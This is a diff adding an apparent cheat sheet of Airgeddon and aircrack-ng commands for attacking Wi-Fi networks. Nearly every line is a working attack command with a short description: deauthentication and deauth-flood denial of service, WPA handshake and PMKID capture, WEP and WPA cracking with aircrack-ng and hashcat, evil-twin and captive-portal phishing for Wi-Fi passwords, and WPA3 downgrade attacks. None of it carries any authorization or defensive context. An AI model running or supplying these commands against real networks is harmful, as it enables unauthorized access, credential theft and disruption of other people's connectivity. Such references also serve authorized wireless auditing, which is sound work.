@@ -1,0 +1,159 @@
+[X] Airgeddon Command List
+
+[\] airgeddon
+[/] Start Airgeddon Wi-Fi auditing tool
+
+[\] sudo airgeddon
+[/] Run Airgeddon with required root privileges
+
+[\] airgeddon --help
+[/] Show help information (if available)
+
+# -------------------------
+# INTERFACE / ADAPTER SETUP
+# -------------------------
+
+[\] airmon-ng start wlan0
+[/] Enable monitor mode on wlan0
+
+[\] airmon-ng check kill
+[/] Kill interfering network processes
+
+[\] iwconfig
+[/] Show wireless interfaces and modes
+
+[\] ip link set wlan0 down
+[/] Disable interface
+
+[\] ip link set wlan0 up
+[/] Enable interface
+
+# -------------------------
+# SCANNING / RECON
+# -------------------------
+
+[\] airodump-ng wlan0mon
+[/] Scan nearby Wi-Fi networks
+
+[\] airodump-ng --band abg wlan0mon
+[/] Scan all Wi-Fi bands (2.4/5 GHz)
+
+[\] airodump-ng -c 6 wlan0mon
+[/] Scan specific channel
+
+[\] airodump-ng --bssid AA:BB:CC:DD:EE:FF wlan0mon
+[/] Target specific access point
+
+# -------------------------
+# HANDSHAKE CAPTURE
+# -------------------------
+
+[\] airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+[/] Capture WPA/WPA2 handshake
+
+[\] aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+[/] Deauthentication attack to force handshake
+
+[\] airgeddon (Handshake capture option)
+[/] Automated handshake capture via menu
+
+# -------------------------
+# WPA/WPA2 ATTACKS
+# -------------------------
+
+[\] aircrack-ng capture.cap -w wordlist.txt
+[/] Crack WPA/WPA2 handshake using wordlist
+
+[\] hashcat -m 22000 capture.hc22000 wordlist.txt
+[/] Crack WPA using GPU (Hashcat)
+
+[\] airgeddon (PMKID attack option)
+[/] Launch PMKID attack (no clients needed)
+
+# -------------------------
+# WEP ATTACKS
+# -------------------------
+
+[\] aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
+[/] ARP replay attack (WEP)
+
+[\] aircrack-ng wep.cap
+[/] Crack WEP key
+
+[\] airgeddon (WEP attack menu)
+[/] Automated WEP cracking
+
+# -------------------------
+# EVIL TWIN / PHISHING
+# -------------------------
+
+[\] airgeddon (Evil Twin attack)
+[/] Create rogue AP to capture credentials
+
+[\] airgeddon (Captive portal attack)
+[/] Launch phishing portal for Wi-Fi password
+
+[\] airbase-ng -e "FreeWiFi" -c 6 wlan0mon
+[/] Create fake access point manually
+
+# -------------------------
+# DEAUTH / DOS
+# -------------------------
+
+[\] aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+[/] Continuous deauthentication attack
+
+[\] mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF
+[/] Deauth flood using mdk4
+
+# -------------------------
+# WPA3 / MODERN ATTACKS
+# -------------------------
+
+[\] airgeddon (WPA3 downgrade attack)
+[/] Attempt downgrade to WPA2
+
+[\] airgeddon (SAE attack options)
+[/] WPA3-SAE attack modules
+
+# -------------------------
+# UTILITIES / TOOLS INTEGRATION
+# -------------------------
+
+[\] airgeddon (Install dependencies)
+[/] Auto-install required tools
+
+[\] airgeddon (Update script)
+[/] Update Airgeddon to latest version
+
+[\] crunch 8 10 abc123 -o wordlist.txt
+[/] Generate custom wordlist
+
+[\] hcxdumptool -i wlan0mon -o capture.pcapng
+[/] Capture PMKID hashes
+
+# -------------------------
+# CLEANUP / RESTORE
+# -------------------------
+
+[\] airmon-ng stop wlan0mon
+[/] Disable monitor mode
+
+[\] service NetworkManager restart
+[/] Restore network services
+
+[\] reboot
+[/] Reboot system if needed
+
+# -------------------------
+# PIPELINE EXAMPLES
+# -------------------------
+
+[\] airmon-ng start wlan0 && airodump-ng wlan0mon
+[/] Enable monitor mode and start scanning
+
+[\] airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon & aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+[/] Capture handshake with deauth assist
+
+[\] hcxdumptool -i wlan0mon -o dump.pcapng && hcxpcapngtool -o hash.hc22000 dump.pcapng
+[/] Capture and convert WPA hashes
